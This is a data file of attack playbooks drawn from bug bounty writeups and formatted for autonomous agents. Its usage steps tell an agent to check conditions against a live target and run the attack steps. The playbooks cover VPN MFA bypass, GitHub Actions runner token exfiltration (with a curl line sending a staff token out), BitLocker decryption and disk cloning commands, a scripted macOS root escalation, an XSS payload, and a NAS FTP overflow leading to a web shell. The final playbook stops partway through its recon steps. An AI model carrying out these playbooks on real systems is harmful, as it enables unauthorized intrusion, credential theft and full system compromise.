description: Agent-ready bug bounty playbooks extracted from writeups.json. Same schema as agent_playbooks_github.json — safe to merge.

usage.step_1: Load tactic_index.json and look up your target's technology under by_technology to get relevant playbook IDs.
usage.step_2: Filter by by_access_level matching your current access to the target.
usage.step_3: Prioritize IDs in high_confidence and quick_wins lists for best hit rate.
usage.step_4: Load matching playbooks from this file by their 'id' field.
usage.step_5: Check trigger_conditions.prerequisites and applicability_signals against the live target.
usage.step_6: If conditions match, run attack_playbook.recon_steps first, then attack_steps.
usage.step_7: Confirm with success_indicators. If failed, use failure_indicators to pivot.

meta.title: No Portals Needed

trigger_conditions.when_to_apply: When a GlobalProtect VPN is configured with MFA enforced only on the portal, but not on the gateway.
prerequisites: The target organization uses Palo Alto GlobalProtect VPN.
applicability_signals: Attempting to connect to the GlobalProtect portal requires MFA.
The GlobalProtect gateway endpoint is accessible.
skip_if: MFA is enforced on both the GlobalProtect portal and gateway.
The GlobalProtect gateway endpoint is not accessible.

recon_steps: Step 1: Identify GlobalProtect VPN portals by scanning for common GlobalProtect URLs or observing traffic from compromised machines within the target network.
Step 2: Attempt to connect to the identified GlobalProtect portal using the official client to confirm MFA enforcement.
attack_steps: Step 1: Identify the GlobalProtect gateway URL. This can often be found in the configuration provided by the portal or by observing network traffic during a legitimate connection.
Step 2: Bypass the portal authentication by directly attempting to connect to the GlobalProtect gateway endpoint. Use the official GlobalProtect client or simulate its requests.
Step 3: If the gateway does not enforce MFA independently, authenticate to the gateway directly without providing an MFA token.
payloads_or_patterns: When connecting to the gateway directly, the client should send the same environment variables as it would to the portal during the prelogin phase, but targeting the gateway's /ssl-vpn/prelogin.esp endpoint.
tools_recommended: Burp Suite: To intercept and analyze GlobalProtect client requests and craft custom requests to the gateway.
GlobalProtect Client: To observe the normal authentication flow and identify required parameters.
success_indicators: Successful connection to the internal network through the GlobalProtect VPN without providing an MFA token.
The GlobalProtect client reports a successful VPN connection after authenticating directly to the gateway.
failure_indicators: The GlobalProtect gateway also enforces MFA independently, prompting for a token. (Pivot: Investigate other VPN solutions or misconfigurations.)
Connection to the gateway fails with an error or is refused. (Pivot: Confirm gateway accessibility and URL.)

playbooks.impact: Gaining unauthorized access to the internal corporate network by bypassing multi-factor authentication, allowing for further lateral movement and exploitation.
playbooks.key_lesson: Always test MFA enforcement independently on all authentication endpoints, especially VPN gateways, as MFA might only be enforced on the initial portal.

meta.title: Discord Rich Presence LeonardSSH.vscord

affected_components: Discord Rich Presence integration, specifically the 'View Repository' button
tech_stack_fingerprints: Discord Desktop App integration via websocket

trigger_conditions.when_to_apply: When a VS Code extension integrates with Discord Rich Presence and displays repository information to other users.
prerequisites: VS Code installed and running
Discord Desktop App installed and running
vscord VS Code extension installed
A Git repository opened in VS Code with a remote origin configured
applicability_signals: The presence of the 'View Repository' button in the Discord Rich Presence status for the extension.
The extension's functionality of opening a repository URL in the browser when the button is clicked.
skip_if: The extension does not implement a 'View Repository' button.
The extension does not use Git repository URLs for the 'View Repository' link.

recon_steps: Step 1: Identify VS Code extensions that integrate with Discord Rich Presence.
Step 2: Examine the functionality of these extensions, particularly any buttons or links that share information with Discord.
Step 3: For the vscord extension, observe the 'View Repository' button and its behavior when clicked.
attack_steps: Step 1: Install the vscord VS Code extension.
Step 2: Open a Git repository in VS Code that has a remote origin configured.
Step 3: Ensure the Discord Desktop App is running and the vscord extension is active.
Step 4: Observe the Discord Rich Presence status for the user and locate the 'View Repository' button.
Step 5: Click the 'View Repository' button to trigger the opening of the repository URL in the default browser.
Step 6: Analyze the opened URL to confirm it originates from the user's `.git/config` file.
payloads_or_patterns: The Git repository URL found in `.git/config` file, e.g., `https://github.com/Sudistark/test-discord-vscode`
tools_recommended: VS Code
Discord Desktop App
success_indicators: The URL of the Git repository, as configured in the `.git/config` file, is opened in the user's browser when the 'View Repository' button is clicked.
The URL displayed in Discord Rich Presence accurately reflects the Git remote origin URL.
failure_indicators: The 'View Repository' button does not appear in Discord Rich Presence.
Clicking the 'View Repository' button opens a generic URL or an error page.
The URL opened does not match the `.git/config` file's remote origin.

playbooks.impact: Disclosure of the Git repository URL, which could include sensitive information or reveal internal project structures to unintended parties. If the repository is private, this could lead to unintended exposure.
playbooks.key_lesson: Always scrutinize information shared by third-party integrations with external services like Discord, as they may inadvertently leak details from local configuration files.

meta.title: Stealing GitHub staff's access token via GitHub Actions

trigger_conditions.when_to_apply: When a repository uses self-hosted runners for workflows triggered by pull requests, especially when the workflow doesn't properly isolate execution environments.
prerequisites: Target repository uses self-hosted runners.
Target repository has workflows triggered by `pull_request` events.
The self-hosted runner environment is not isolated per job execution.
applicability_signals: Observable use of `pull_request` trigger in workflow files.
Configuration or documentation indicating the use of self-hosted runners.
Workflow definitions that might involve executing code from forked repositories in a self-hosted runner context.
skip_if: The target specifically uses GitHub-hosted runners which are isolated per job.
All workflows are triggered by events that do not originate from potentially untrusted sources (e.g., only `push` from within the same repository).

recon_steps: Step 1: Identify repositories that use GitHub Actions and have workflows defined.
Step 2: Examine workflow files (e.g., `.github/workflows/*.yml`) for `pull_request` triggers.
Step 3: Check documentation or workflow configurations for the usage of self-hosted runners.
Step 4: If self-hosted runners are used, assess if the environment isolation is explicitly configured and robust.
attack_steps: Step 1: Create a malicious pull request from a forked repository to the target repository.
Step 2: Craft a workflow within the malicious pull request that, when triggered, executes arbitrary commands on the self-hosted runner.

Step 3: The arbitrary command should aim to steal sensitive information, such as the GitHub Personal Access Token associated with the staff account, which is likely available in the runner's environment or accessible via internal GitHub APIs.
Step 4: Once the token is exfiltrated, use it to perform unauthorized actions as a GitHub staff member.
payloads_or_patterns: Workflow YAML content designed to execute shell commands (e.g., using `run` keyword) that exfiltrate environment variables or make authenticated requests to internal GitHub APIs. Example command snippet: `curl -s -X POST -H "Authorization: token <STAFF_TOKEN>" -d '{"text":"Compromised via PR from <FORK_OWNER>"}' <INTERNAL_SLACK_WEBHOOK>` (requires knowledge of staff token or internal endpoints)
Exploiting the delay in asynchronous scripts in workflows like `e2etest.yml` to inject commands before the runner is cleaned up or reassigned.
tools_recommended: GitHub CLI (`gh`) for creating pull requests and interacting with repositories.
A tool for hosting a malicious fork of the target repository.
Custom scripts to automate the creation of malicious pull requests and exfiltration of sensitive data.
success_indicators: Successful exfiltration of the GitHub staff's Personal Access Token.
Observation of unauthorized actions performed using the stolen token (e.g., code commits to sensitive repositories, modification of repository settings).
Receipt of a callback or notification on an attacker-controlled server indicating token compromise.
failure_indicators: Pull requests not triggering workflows or commands not executing on the self-hosted runner (e.g., due to misconfiguration or lack of `pull_request` trigger usage).
Workflow execution completes without any sensitive information being leaked, indicating proper isolation or absence of valuable secrets in the runner environment.

playbooks.impact: Stealing a GitHub staff's Personal Access Token allows an attacker to perform actions with the privileges of that staff member. This could include modifying sensitive repositories (like `actions/checkout`, `actions/cache`), inserting malicious code into the supply chain, compromising other users' repositories, or accessing private information.
playbooks.key_lesson: When using self-hosted runners with workflows triggered by pull requests from forks, always ensure strict environment isolation and limit the privileges of the runner's token to prevent attackers from compromising the runner and executing arbitrary code.

meta.title: Compromising Garmin’s Sport Watches: A Deep Dive into GarminOS and its MonkeyC Virtual Machine
meta.vuln_type: Permission bypass | Buffer Overflow | Out-of-bounds Read/Write | Integer Overflow | Type Confusion

trigger_conditions.when_to_apply: When a Connect IQ application is being installed or executed on a Garmin device, and the virtual machine does not properly validate input or resource handling within its native functions or API calls.
prerequisites: Ability to install a Connect IQ application on a target Garmin device.
Knowledge of a vulnerable CIQ API version.
applicability_signals: Garmin devices supporting Connect IQ applications.
Use of CIQ API versions lower than the fixed versions (e.g., < 3.1.x for some vulnerabilities).
Observing specific error patterns or unexpected behavior during CIQ app execution.
skip_if: The target device does not support Connect IQ applications.
The CIQ API version on the target device is known to be patched for the specific vulnerability.
All attempts to load malformed resources or call native functions with incorrect arguments result in immediate app termination without exploitable behavior.

recon_steps: Step 1: Identify target Garmin devices that support Connect IQ applications.
Step 2: Determine the installed Connect IQ API version on the target device.
Step 3: Research the disclosed vulnerabilities (e.g., GRMN-01 to GRMN-13) and their corresponding CIQ API version requirements.

Step 4: Analyze the Garmin Connect IQ SDK and documentation for potential areas of interest related to string loading, bitmap initialization, sensor data, channel communication, encryption, and font resources.
attack_steps: Step 1: Develop a malicious Connect IQ application using MonkeyC (or assembly for low-level exploits).

Step 2: For GRMN-02/03 (String Resource Out-of-bound read/Inconsistent size): Craft CIQ app resource files (e.g., strings.xml) with oversized or malformed entries to trigger out-of-bounds reads or size inconsistencies during loading.
Step 3: For GRMN-04 (Integer overflows in BufferedBitmap): Trigger integer overflow conditions in Bitmap initialization by providing malformed input values for width, height, or color depth.

Step 4: For GRMN-05 (SensorHistory permission bypass): Design a CIQ app that attempts to access sensor data (e.g., GPS, heart rate) without declaring the necessary permissions in the manifest, to test if the permission check is bypassed.

Step 5: For GRMN-06/07/08/10 (Buffer overflows): Craft inputs for font resources, Toybox.GenericChannel.setDeviceConfig, Toybox.Ant.GenericChannel.enableEncryption, and Toybox.Cryptography.Cipher.initialize that exceed expected buffer sizes.

Step 6: For GRMN-09/11 (Relative out-of-bound write / Type confusion in Toybox.Ant.BurstPayload): Manipulate data within the BurstPayload mechanism to cause out-of-bounds writes or type confusion errors.
Step 7: For GRMN-12 (Native functions argument count): Call native functions from the CIQ app with an incorrect number of arguments to check for insufficient validation.
Step 8: For GRMN-13 (Permission bypass via field definition manipulation): Attempt to manipulate object field definitions within the CIQ app to gain unauthorized access to protected resources.
Step 9: Install the crafted malicious CIQ application onto the target Garmin device.
Step 10: Observe the device's behavior, logs, or any callback mechanisms (if applicable) to confirm exploitation.
payloads_or_patterns: Malformed strings.xml entries with excessive lengths or invalid characters.
Integer values leading to overflows in Bitmap initialization parameters (e.g., width, height).
CIQ app manifest lacking required permissions for sensitive API calls (e.g., sensor access).
Data payloads for Toybox.GenericChannel, Toybox.Ant, and Toybox.Cryptography functions that exceed expected buffer sizes or have incorrect type structures.
Calls to native functions with a non-standard number of arguments.
tools_recommended: MonkeyC SDK: For developing and compiling CIQ applications.
Garmin Connect IQ Developer Tools: For debugging and deploying CIQ apps.
Reverse engineering tools (e.g., Ghidra, IDA Pro): For analyzing GarminOS firmware and TVM opcodes.
Custom scripts: For automating the generation of malformed inputs and testing various exploit vectors.
success_indicators: Crash or reboot of the Garmin device indicating a segmentation fault or unhandled exception.
Garmin device exhibiting unexpected behavior, such as displaying data from unauthorized sources or performing actions without user consent.
Successful bypass of permission checks, allowing access to sensitive information (e.g., location, health metrics).
Execution of arbitrary code or commands within the TVM sandbox or, in severe cases, on the underlying GarminOS (if native code execution is achieved).
Confirmation of out-of-bounds reads/writes through observable data corruption or leakage.
failure_indicators: CIQ application fails to install or immediately crashes upon launch due to basic syntax errors.
Garmin device robustly handles malformed inputs by simply terminating the application without any exploitable side effects (e.g., error codes, data leaks).
All permission checks are strictly enforced, preventing unauthorized API access.
WAF-like behavior within the TVM that sanitizes or rejects potentially malicious inputs before they can trigger vulnerabilities.

playbooks.impact: Attacker can bypass security permissions to access sensitive user data (e.g., location, health metrics), potentially leading to data leakage, privacy violations, or further compromise of the device. In severe cases, this could allow for denial-of-service conditions or even arbitrary code execution on the watch.
playbooks.key_lesson: Always validate input lengths, buffer sizes, argument counts, and data types when interacting with virtual machine opcodes, native functions, and resource loading mechanisms in embedded systems.

meta.title: From BitLocker-Suspended to Virtual Machine

affected_components: BitLocker encryption key storage when in 'Suspended' state

trigger_conditions.when_to_apply: When BitLocker is found to be in a 'Suspended' state on a target system, and the attacker has low-privilege user access.
prerequisites: BitLocker is enabled but in a 'Suspended' state.
Attacker has non-administrator access to the target machine.
Attacker can boot the target machine from external media (e.g., USB).
applicability_signals: Output of 'manage-bde -status' shows BitLocker is in a 'Suspended' state.
System does not have a TPM actively managing BitLocker keys.
skip_if: BitLocker is not suspended.
TPM is actively managing BitLocker keys and requires a recovery key.

recon_steps: Step 1: Execute 'manage-bde -status' on the target Windows machine to check the BitLocker status. Observe if it is in a 'Suspended' state.
attack_steps: Step 1: If BitLocker is suspended, create a Windows Setup USB drive.
Step 2: Boot the target machine from the Windows Setup USB drive.
Step 3: Access the command prompt from the Windows Setup environment.
Step 4: Execute the command 'manage-bde -off c:' to decrypt the drive.
Step 5: Monitor the decryption progress using 'manage-bde -status'.
Step 6: Once decryption is complete, boot the target machine into a Linux live environment (e.g., Kali Linux, Ubuntu Live USB).
Step 7: Mount the decrypted hard drive.
Step 8: Clone the entire hard drive using the 'dd' command: 'dd if=/dev/sda of=laptop.img bs=4096 conv=noerror,sync'.
Step 9: Convert the raw disk image to a VMDK format using VirtualBox's VBoxManage tool: 'VBoxManage convertfromraw laptop.img laptop.vmdk --format VMDK'.
Step 10: Create a new virtual machine in VirtualBox using the generated laptop.vmdk as the hard drive.
Step 11: Configure the virtual machine to use UEFI booting if the original system used it.
Step 12: Start the virtual machine and take a snapshot immediately after successful boot.
payloads_or_patterns: manage-bde -status
manage-bde -off c:
dd if=/dev/sda of=laptop.img bs=4096 conv=noerror,sync
VBoxManage convertfromraw laptop.img laptop.vmdk --format VMDK
tools_recommended: Windows Installation Media (USB)
Linux Live Distribution (e.g., Kali Linux)
dd command (for disk cloning)
VirtualBox (or other VM software)
VBoxManage (for disk image conversion)
success_indicators: The command 'manage-bde -off c:' successfully initiates decryption.
The target hard drive can be mounted in a Linux live environment after decryption.
The cloned virtual machine boots successfully with UEFI enabled.
The virtual machine retains system and user certificates, allowing network connectivity.
failure_indicators: BitLocker does not show 'Suspended' state (suggests standard recovery key required).
Decryption command fails or hangs indefinitely.
Target drive cannot be mounted in Linux after decryption.
Virtual machine fails to boot after cloning, even with UEFI enabled (may indicate drive corruption or other boot issues).

playbooks.impact: Gains full administrative control over the target laptop by decrypting the hard drive and virtualizing the system. This allows for disabling security software, executing malicious payloads without a trace, snapshotting and reverting system states, and easier network traffic capture and analysis.
playbooks.key_lesson: When BitLocker is in a 'Suspended' state, the encryption key is stored in the clear, allowing decryption via a Windows Setup USB and subsequent system virtualization for unhindered analysis.

meta.title: XS-Leak: Deanonymize Microsoft Skype Users by any 3rd-party websites

affected_components: Image attachments and their associated URLs

trigger_conditions.when_to_apply: When an attacker can obtain a direct URL to an image attachment sent via Skype and control a third-party website. This allows tracking user activity based on image load events.
prerequisites: Attacker can send image attachments to a victim through Skype.
Attacker can trick the victim into visiting a controlled third-party website.
applicability_signals: Skype image attachment URLs are accessible and can be embedded in third-party websites.
Image loading triggers `onload` and `onerror` JavaScript events that can be observed.
skip_if: Skype image URLs are not accessible externally or are dynamically generated and tied to active sessions.
Third-party websites are unable to embed external images or observe JavaScript event handlers.

recon_steps: Step 1: Send an image attachment to a target user in Skype and obtain the direct URL to the attachment. Observe the structure of the URL for potential identifiers.
Step 2: Attempt to embed the obtained Skype image URL into a simple HTML page hosted on a third-party server controlled by the attacker.
attack_steps: Step 1: Craft an HTML page with an `` tag pointing to the obtained Skype image URL. Attach `onload` and `onerror` event handlers to this `` tag.
Step 2: Host this crafted HTML page on a web server controlled by the attacker.
Step 3: Trick the target Skype user into visiting the attacker's crafted HTML page (e.g., via phishing or social engineering).
Step 4: Monitor the network traffic or use JavaScript `alert()` or `console.log()` within the `onload` and `onerror` event handlers to determine which event is triggered.
tools_recommended: Burp Suite or similar proxy to capture network requests and analyze responses.
A simple web server (e.g., Python's http.server) to host the attacker's HTML page.
A custom logging endpoint to record `onload` and `onerror` events.
success_indicators: The `onload` event fires when the target user visits the attacker's page, indicating the image was successfully loaded (likely by the target).
The `onerror` event fires when a user *other than* the target visits the attacker's page, indicating the image failed to load (as it's specific to the target's session/context).
failure_indicators: Both `onload` and `onerror` fire for all visitors, or neither fires. This suggests the image URL is not accessible or the event handlers are not being triggered as expected. Pivot: Investigate alternative XS-Leak vectors if available, or try different image URL formats.
A WAF blocks the request to the attacker's server or the embedding of the Skype image URL.

playbooks.impact: Deanonymization of Skype users, enabling tracking of their online activities and association of their anonymous browsing habits to their specific Microsoft Skype accounts. This poses significant privacy risks.
playbooks.key_lesson: Observe JavaScript `onload` and `onerror` events on embedded resources (like images) from sensitive services when a user interacts with a third-party website to detect user presence and deanonymize them.

meta.title: CVE-2023-23525: Get Root via A Fake Installer

affected_components: Finder's Open With functionality for installer packages (.pkg files)

trigger_conditions.when_to_apply: This technique is applicable when a user can be tricked into opening a malicious installer package (.pkg file) with a modified default application, allowing for privilege escalation.
prerequisites: User must be able to download and execute arbitrary files on the target macOS system.
The target macOS version must be vulnerable (prior to 13.3).
applicability_signals: The ability to change the default application for opening .pkg files.
The presence of the `AuthorizationCopyRights` API, which can be hooked.
skip_if: macOS version 13.3 or later, which prevents changing the default application for PKG files.
The target system has security measures that prevent users from executing arbitrary code or modifying system settings.

recon_steps: Step 1: Identify the default application for opening .pkg files on macOS (Installer.app).
Step 2: Confirm that the target macOS version allows modification of the default handler for .pkg files using LaunchServices.framework APIs (e.g., `LSSetDefaultRoleHandlerForContentType`).
attack_steps: Step 1: Create a malicious installer package that replaces the default `Installer.app` with a custom version.
Step 2: The custom `Installer.app` should include a 'trampoline' executable that injects a malicious `libfishhook.dylib` using the `DYLD_INSERT_LIBRARIES` environment variable.
Step 3: The `libfishhook.dylib` should hook the `AuthorizationCopyRights` API.
Step 4: Inside the hooked `AuthorizationCopyRights` function, execute a payload with root privileges using `AuthorizationExecuteWithPrivileges` (e.g., create a file like `/usr/bin/touch /tmp/pwned`).
Step 5: Modify the default handler for .pkg files to point to the custom `Installer.app` using `lsregister` and `swda` (or equivalent commands).
Step 6: Entice the user to open a .pkg file, which will trigger the custom installer and execute the payload with root privileges.
payloads_or_patterns:
#!/bin/sh
cp -r /System/Library/CoreServices/Installer.app /Applications
codesign --remove-signature /Applications/Installer.app
mv trampoline /Applications/Installer.app/Contents/MacOS/
mv libfishhook.dylib /tmp
plutil -replace CFBundleExecutable -string 'trampoline' /Applications/Installer.app/Contents/Info.plist
plutil -replace CFBundleIdentifier -string 'com.hacker.installer' /Applications/Installer.app/Contents/Info.plist
codesign -f -s - /Applications/Installer.app/Contents/MacOS/Installer
codesign -f -s - /Applications/Installer.app
/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/LaunchServices.framework/Versions/A/Support/lsregister -f /Applications/Installer.app
./swda setHandler --UTI com.apple.installer-package-archive --app /Applications/Installer.app

#!/usr/bin/env python3
import os , subprocess
os.environ[ 'DYLD_INSERT_LIBRARIES' ] = '/tmp/libfishhook.dylib'
subprocess.call('/Applications/Installer.app/Contents/MacOS/Installer')
tools_recommended: swda (for setting default handler)
codesign (for managing signatures)
plutil (for modifying .plist files)
C compiler (for creating the trampoline executable)
dylib hooking framework (e.g., fishhook)
success_indicators: The payload executes successfully with root privileges (e.g., a file is created in a root-owned directory, like `/tmp/pwned`).
The user is prompted for administrator credentials to install the fake package, and upon granting them, the root privilege escalation occurs.
failure_indicators: The default handler for .pkg files cannot be changed (indicates patch or different macOS version).
The fake installer fails to launch or execute the payload.
The `AuthorizationCopyRights` hook is not triggered or fails.
The system detects and blocks the unauthorized signature changes.

playbooks.impact: The attacker can achieve arbitrary code execution with root privileges on the victim's macOS system, leading to full system compromise.
playbooks.key_lesson: Always investigate the ability for users to change default application handlers for critical file types on desktop operating systems, as this can be a vector for privilege escalation by substituting legitimate applications with malicious ones.

meta.title: Turning Vulnerability into Bounty: How CVE-2020–17453 XSS Earned Me a $500 Bounty

trigger_conditions.when_to_apply: When the target application is identified as using WSO2 Management Console and an administrative login page is discoverable via directory brute-forcing.
prerequisites: Target application is running WSO2 Management Console.
Researcher has identified a potential administrative login endpoint (e.g., /admin leading to /carbon/admin/login.jsp).
applicability_signals: Response header indicating WSO2 (if present)
Presence of /carbon/admin/login.jsp
Successful directory brute-force yielding /admin
skip_if: WAF blocks access to /admin or /carbon/admin/login.jsp.
No WSO2 components are detected.

recon_steps: Step 1: Perform directory brute-forcing on discovered subdomains using tools like Dir-search to identify potential administrative interfaces.
Step 2: Analyze scan results for patterns like '/admin' redirects to '/carbon/admin/login.jsp' to identify WSO2 Management Console instances.
Step 3: Perform Google searches for 'CVE-2020-17453' and 'WSO2 Management Console' to confirm the presence and exploitability of the vulnerability.
attack_steps: Step 1: Create a Node.js script to automate the testing of multiple subdomains for the CVE-2020–17453 vulnerability.
Step 2: For each identified subdomain, construct a crafted URL containing the XSS payload targeting the vulnerability.
Step 3: Execute the Node.js script to send requests to the crafted URLs against each subdomain.
Step 4: Monitor the script's output for successful exploitation indicators.
payloads_or_patterns: Refer to CVE-2020-17453 exploit details for the specific payload. A common pattern for reflected XSS is injecting a script into a parameter that is reflected back in the response. Example (conceptual, actual payload depends on WSO2 version and specific parameter): <TARGET_URL>/<path_to_vulnerable_endpoint>?param=<script>alert(document.domain)</script>
tools_recommended: Dir-search: For directory brute-forcing.
Subsleuth: For subdomain brute-forcing and discovering subdomains of subdomains.
httpx: To check for active and live domains.
Node.js: To automate the testing process with custom scripts.
success_indicators: The script outputs a payload that indicates successful execution of JavaScript (e.g., 'alert(document.domain)' pops up in the context of the target subdomain).
The writeup mentions 'an output containing the payload' which implies a clear confirmation of successful injection.
failure_indicators: The script does not report any successful XSS execution for a given subdomain.
Target returns a 403 Forbidden or other error code preventing payload delivery or execution.

playbooks.impact: Attacker can inject and execute malicious JavaScript in the victim's browser within the context of the WSO2 Management Console. This can lead to session hijacking, cookie theft, credential harvesting, or performing actions on behalf of the user.
playbooks.key_lesson: Automate the testing of known vulnerabilities like CVE-2020-17453 across a large number of subdomains using custom scripts to increase efficiency and discoverability.

meta.title: GhostToken – Exploiting GCP application infrastructure to create invisible, unremovable trojan app on Google accounts

target_profile.technology: Google Cloud Platform (GCP) applications with OAuth integration
affected_components: Google account application management, OAuth token handling
tech_stack_fingerprints: Applications using OAuth for Google account access

trigger_conditions.when_to_apply: When an attacker can influence the visibility or management state of an OAuth-authorized application within a Google account.
prerequisites: The target Google account must have authorized a third-party application via OAuth.
applicability_signals: Existence of a Google account where third-party apps can be authorized.
Ability to create or modify applications that integrate with Google services via OAuth.
skip_if: Google accounts that do not use OAuth for third-party application authorization.
Environments where application visibility and management are not subject to the described flaw.

recon_steps: Step 1: Identify Google accounts that have authorized third-party applications.
Step 2: Investigate the APIs and mechanisms used by GCP applications to manage their visibility and authorization status within Google accounts.
attack_steps: Step 1: As an attacker, create a malicious application and obtain an OAuth token for a victim's Google account.
Step 2: Exploit the GhostToken vulnerability to change the malicious application's state to 'invisible' within the victim's Google account application management page.
Step 3: The victim's application management page will not show the malicious app, making it unremovable.
Step 4: The attacker can toggle the application's visibility to 'visible' to interact with the victim's account and then revert it to 'invisible' to maintain the unremovable state.
payloads_or_patterns: Insufficient detail in writeup for specific payloads, but the core mechanism involves manipulating application visibility settings via GCP APIs.
tools_recommended: Burp Suite or similar proxy to intercept and analyze API requests.
Custom scripts to interact with GCP APIs for OAuth token management and application state manipulation.
success_indicators: The malicious application is no longer visible on the victim's Google account application management page.
The attacker can successfully revoke the malicious application's access through their own control panel, while it remains hidden and unremovable from the victim's perspective.
The attacker can continue to access the victim's Google account resources using the obtained OAuth token.
failure_indicators: The malicious application remains visible on the victim's Google account and can be easily revoked.
API calls to alter application visibility return errors or are rejected.
Error: Insufficient detail in writeup for specific failure indicators and pivot suggestions.

playbooks.impact: An attacker can create a persistent, hidden, and unremovable trojan application within a victim's Google account, granting them long-term access to the victim's data and resources without the victim's knowledge or ability to easily revoke access.
playbooks.key_lesson: Always verify the security controls for OAuth application management, especially those that can affect application visibility and removability from user accounts.

meta.title: The Fuzzing Guide to the Galaxy: An Attempt with Android System Services

affected_components: System Services exposed via Binder IPC
tech_stack_fingerprints: Presence of closed-source native services specific to manufacturers like Samsung

trigger_conditions.when_to_apply: When targeting Android devices, especially manufacturer-specific native system services, that utilize Binder IPC for inter-process communication. The target system services must accept malformed input that can lead to memory corruption.
prerequisites: Ability to interact with Android system services via Binder IPC.
Knowledge or discovery of specific Binder interfaces and transaction codes used by target services.
applicability_signals: Existence of closed-source native services.
Observation of Binder transactions involving Parcel serialization/deserialization.
skip_if: Target services are purely open-source and fully analyzed.
The Binder driver or relevant kernel modules are not accessible or configurable for fuzzing.
No specific Binder interfaces or transaction codes are identifiable for fuzzing.

recon_steps: Step 1: Identify target Android device and manufacturer-specific native services. (e.g., Samsung Galaxy J6)
Step 2: Analyze the Binder IPC mechanism of the target device to understand interface definitions and transaction codes for system services.
Step 3: Review existing fuzzing tools and techniques for Android native services, such as FANS, and adapt them for binary-based analysis.
Step 4: Develop or adapt a fuzzer capable of generating malformed Binder transactions, focusing on fuzzing the Parcel data.
attack_steps: Step 1: Instrument or analyze the target native service to understand its Binder interface and transaction handling.
Step 2: Generate malformed Binder transactions targeting specific interface/transaction codes.
Step 3: Send these malformed transactions to the target Binder service using an appropriate client.
Step 4: Monitor the target service for crashes, hangs, or unexpected behavior indicative of memory corruption.
Step 5: If a crash occurs, perform post-mortem analysis to confirm the nature of the vulnerability (e.g., heap overflow, out-of-bounds write).
payloads_or_patterns: Fuzzing input for Binder transactions targeting Parcel data, including but not limited to: large integer values, negative values, oversized strings, null pointers, corrupted data structures.
tools_recommended: Custom Binder fuzzing framework adapted from existing research (e.g., FANS)
Android Debug Bridge (ADB) for interaction and monitoring
Static analysis tools (e.g., Ghidra, IDA Pro) for reverse engineering native services
Dynamic analysis tools (e.g., Valgrind, AddressSanitizer) for memory error detection
success_indicators: Target system service crashes (e.g., SIGSEGV, SIGABRT).
Observed memory corruption errors reported by dynamic analysis tools.
Successful exploitation of identified vulnerabilities (e.g., CVE-2022-39907, CVE-2022-39908) confirmed through PoCs.
failure_indicators: No crashes or anomalous behavior observed after extensive fuzzing of identified interfaces. Suggestion: Investigate other Binder interfaces or focus on different attack vectors.
WAF or security controls blocking malformed Binder transactions. Suggestion: Bypass WAF or use alternative communication channels if possible.

playbooks.impact: Execution of arbitrary code with the privileges of the targeted system service, potentially leading to Local Privilege Escalation (LPE) on the Android device, allowing attackers to gain elevated permissions and control over the system.
playbooks.key_lesson: Adapt fuzzer logic to deeply understand and target the specifics of Android's Binder IPC mechanism, including Parcel data structures and transaction codes, to uncover memory corruption vulnerabilities in closed-source native services.

meta.title: CVE-2022-29844: A Classic Buffer Overflow On The Western Digital My Cloud Pro Series PR4100

target_profile.technology: Western Digital My Cloud Pro Series PR4100 NAS

trigger_conditions.when_to_apply: The FTP service must be enabled on the target device. Additionally, for arbitrary file write, at least one share must be configured as 'Public' and accessible via FTP.
prerequisites: FTP service is enabled on the target.
Network access to the FTP service (port 21).
applicability_signals: Target device is a Western Digital My Cloud Pro Series PR4100.
FTP service is reported as active in network services configuration.
skip_if: FTP service is disabled.
No shares are accessible via FTP (for write operations).

recon_steps: Step 1: Enumerate open ports on the target IP address, looking for port 21 (FTP).
Step 2: If port 21 is open, attempt to connect to the FTP service using an anonymous login to check its accessibility.
attack_steps: Step 1: Send a USER command with a username string larger than 2048 bytes to trigger the buffer overflow in the `douser()` function.
Step 2: Observe the response to confirm if the overflow occurred and if control flow can be manipulated.
Step 3: If successful, manipulate the overwritten `loggedin` and `wd` global variables to achieve arbitrary file read/write.
Step 4: Use `cwd` to navigate to a directory where arbitrary file write is permitted.
Step 5: Use `stor` to write a malicious file (e.g., a web shell) to a web-accessible directory.
Step 6: Use `retr` to read sensitive files if the write capability is not feasible or to gain further information for exploitation.
Step 7: Access the deployed web shell via the NAS web server to achieve RCE.
payloads_or_patterns: USER AAAA...AAAA (2048+ bytes of 'A')
CWD <target_directory>
STOR <malicious_file_name>
RETR <target_file_path>
tools_recommended: Netcat for direct TCP connection to port 21.
Custom Python script for sending FTP commands and managing the exploit chain.
success_indicators: Successful arbitrary file read (e.g., retrieving `/etc/passwd`).
Successful arbitrary file write (e.g., creating a file in the web root).
Execution of commands via the deployed web shell.
Unexpected behavior or crash in the FTP service followed by ability to interact with the device through alternative means.
failure_indicators: FTP service rejects USER command with a length check before the overflow.
FTP service crashes or becomes unresponsive without allowing further interaction (potential DoS).
Inability to write to designated directories due to file system permissions.
Web shell is not functional or accessible.

playbooks.impact: Remote code execution (RCE) on the Western Digital My Cloud Pro Series PR4100 NAS device, allowing an attacker to gain full control, read arbitrary files, write arbitrary files, and potentially install backdoors or exfiltrate sensitive data.
playbooks.key_lesson: Always analyze the input validation of string copy operations (like `strncpy`) in network services, especially when dealing with user-controlled input, as they are common sources of buffer overflow vulnerabilities.

meta.title: How I hacked hackers in Voorivex Hunt Event

tech_stack_fingerprints: WordPress website detected (implied by xmlrpc.php targeting)
MongoDB service running on non-standard port (27017)

trigger_conditions.when_to_apply: When a web application is protected by Cloudflare and direct access is blocked, but the origin IP can be discovered via misconfigurations or verbose endpoints like WordPress's xmlrpc.php.
prerequisites: Target is protected by Cloudflare or a similar WAF.
Target has WordPress installed and `xmlrpc.php` is accessible.
applicability_signals: Cloudflare blocking requests.
Application appears to be a WordPress site (e.g., checking robots.txt, sitemap, or specific WordPress URLs).
Presence of `xmlrpc.php` endpoint.
skip_if: No WordPress detected.
Cloudflare is bypassed via other means (e.g., finding origin IP through DNS history or other subdomains).
`xmlrpc.php` is disabled or returns errors indicating it's not functional.

recon_steps: Step 1: Attempt to access target resources, observe Cloudflare block pages.
Step 2: Use `curl --request GET --url https://api.securitytrails.com/v1/history/<TARGET_DOMAIN>/dns/a --header 'apikey: <SECURITY_TRAILS_API_KEY>'` to enumerate IPs, filter for non-Cloudflare IPs.
Step 3: Attempt `ping`, `nslookup`, `dig` on subdomains to find origin IPs.
Step 4: Identify if the target is a WordPress site (e.g., by checking for `wp-login.php` or common WordPress file structures).
Step 5: Check for the existence and accessibility of `xmlrpc.php` on the target domain.
